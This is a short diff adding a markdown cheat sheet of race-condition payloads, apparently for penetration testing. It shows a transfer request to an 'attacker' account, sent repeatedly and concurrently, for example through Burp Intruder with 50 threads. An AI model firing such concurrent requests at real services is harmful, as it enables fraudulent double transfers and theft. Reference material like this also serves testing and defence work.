@@ -1,0 +1,11 @@
+# Race Condition Payloads
+
+## Timing Attacks
+# Send multiple requests simultaneously
+GET /api/transfer?to=attacker&amount=1000
+# Repeat 10x
+
+## Concurrent Requests
+# Burp Intruder
+# Number of threads: 50
+# Send same request rapidly
